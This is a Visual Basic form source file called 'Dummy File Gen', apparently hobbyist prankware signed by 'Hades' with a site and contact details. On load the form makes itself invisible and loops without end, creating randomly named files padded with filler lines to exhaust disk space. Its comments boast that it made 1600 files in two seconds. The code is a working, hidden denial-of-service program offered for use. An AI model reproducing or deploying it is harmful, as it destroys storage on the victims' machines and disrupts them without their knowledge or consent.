VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Dummy File Gen"
   ClientHeight    =   1335
   ClientLeft      =   3645
   ClientTop       =   2430
   ClientWidth     =   1395
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1335
   ScaleWidth      =   1395
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   0
      TabIndex        =   1
      Text            =   "Text2"
      Top             =   360
      Width           =   1335
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   0
      TabIndex        =   0
      Text            =   "Text1"
      Top             =   0
      Width           =   1335
   End
   Begin VB.Label Label1 
      Caption         =   "Don't test this puppy on yourself. It ain't pretty!"
      Height          =   615
      Left            =   0
      TabIndex        =   2
      Top             =   720
      Width           =   1335
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' Hey d00ds!
'This program was created by Hades.
'Check out my site Http://HadesHell.dhs.org for more programs
'TripleXXX@bigfoot.com
'ICQ#47207625
'Latez,
' -Hades

Public Enum iSelectedType
    EString = 1
ENumber = 2
End Enum

Private Sub Form_Load()
Do
'generates a random file with a length of 10 characters, it does this repeatedly to continuely create new file names
sRandom = RandomValue(EString, 10)
'displays the random name in text1
text2.Text = sRandom
'opens the file and then it just repeats over and over saving files,
Open Text1.Text + text2.Text For Append As #1
'any text you add with Write #1, "" will be placed into the file
    Write #1, "Dummy file created by Hades"
    Write #1, "Add more lines of output to make"
    Write #1, "the filesize larger and take up"
    Write #1, "more space on the harddrive."
    Write #1, "It is not recomended that you test"
    Write #1, "this program on your hard drive unless"
    Write #1, "You change how many times it loops"
    Write #1, "Otherwise it'll keep going till you"
    Write #1, "close the program. This can waste a "
    Write #1, "lot of space"
    Write #1, "TRUST ME THIS WORKS! I accidently ran"
    Write #1, "it and make 1600 files in 2seconds."
    Write #1, "It can be nasty"
    Write #1, "so be careful d00ds!!"
    'the next shitload of lines is to waste more HD space
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Write #1, "Dummy Lines!!!"
    Close #1
Loop
End Sub
